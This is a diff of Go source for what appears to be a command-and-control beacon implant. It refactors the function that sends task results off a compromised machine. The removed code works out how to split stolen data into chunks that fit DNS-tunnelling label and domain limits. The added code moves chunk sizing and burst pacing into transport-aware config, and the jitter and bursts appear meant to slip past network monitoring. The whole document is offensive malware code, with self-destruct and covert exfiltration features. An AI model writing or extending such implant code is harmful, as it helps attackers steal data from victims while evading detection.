@@ -415,69 +415,11 @@ func (b *Beacon) selfDestruct() string {
 func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 	exfilPhase := b.client.config.GetDataExfilPhase()
 
-	maxCmd := exfilPhase.MaxPayload
-	if maxCmd <= 0 {
-		maxCmd = b.client.config.MaxCommandLength
-	}
-	if maxCmd <= 64 {
-		maxCmd = 800
-	}
-
-	maxSubLen := exfilPhase.MaxPayload
-	if maxSubLen <= 0 {
-		maxSubLen = b.client.config.MaxSubdomainLength
-	}
-
-	overhead := 63
-	if !exfilPhase.Encrypted {
-		overhead = 35
-	}
-
-	var safeRawChunk int
-	if maxSubLen > 0 {
-		labelDots := maxSubLen / 63
-		encodedBudget := maxSubLen - labelDots
-		safeRawChunk = encodedBudget*5/8 - overhead
-		if safeRawChunk < 1 {
-			safeRawChunk = 1
-		}
-	} else {
-		calcOverhead := 100
-		safeRawChunk = (maxCmd - calcOverhead) / 2
-		if safeRawChunk < 8 {
-			safeRawChunk = 8
-		}
-	}
-
-	if exfilPhase.PayloadFormat != "" {
-		xSlots := countDataSlots(exfilPhase.PayloadFormat)
-		formatChunk := xSlots*5/8 - overhead
-		if formatChunk >= 1 {
-			if safeRawChunk == 0 || formatChunk < safeRawChunk {
-				safeRawChunk = formatChunk
-			}
-		}
-	}
-
-	maxDomainLen := 0
-	for _, d := range b.client.config.GetDomains() {
-		if len(d) > maxDomainLen {
-			maxDomainLen = len(d)
-		}
-	}
-	if maxDomainLen == 0 {
-		maxDomainLen = 20
-	}
-	subBudget := 253 - 1 - maxDomainLen
-	fqdnLabelDots := subBudget / 63
-	fqdnEncoded := subBudget - fqdnLabelDots
-	fqdnCap := fqdnEncoded*5/8 - overhead
-	if fqdnCap < 8 {
-		fqdnCap = 8
-	}
-	if safeRawChunk > fqdnCap {
-		safeRawChunk = fqdnCap
-	}
+	// Chunk sizing is transport-dependent. On DNS the ceiling comes from label
+	// and FQDN budgets; on HTTP it comes from the operator's configured payload
+	// and the listener's body limit. Same knobs, same build request, different
+	// physics.
+	safeRawChunk := b.client.config.ResultChunkSize()
 
 	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk
 	if totalChunks == 0 {
@@ -505,20 +447,16 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 	jitterMin := b.client.config.ExfilJitterMinMs
 	jitterMax := b.client.config.ExfilJitterMaxMs
-	chunksPerBurst := b.client.config.ExfilChunksPerBurst
-	burstPause := b.client.config.ExfilBurstPauseMs
+	// Pacing follows the transport too: the HTTP values replace the DNS rhythm
+	// when the operator set them, because a 64 KiB chunk and an 80 byte chunk do
+	// not want the same burst pattern.
+	chunksPerBurst, burstPause := b.client.config.ResultBurst()
 
 	if jitterMin <= 0 {
 		jitterMin = 1000
 	}
 	if jitterMax < jitterMin {
 		jitterMax = jitterMin + 1000
-	}
-	if chunksPerBurst <= 0 {
-		chunksPerBurst = 10
-	}
-	if burstPause <= 0 {
-		burstPause = 5000
 	}
 
 	failedChunks := 0
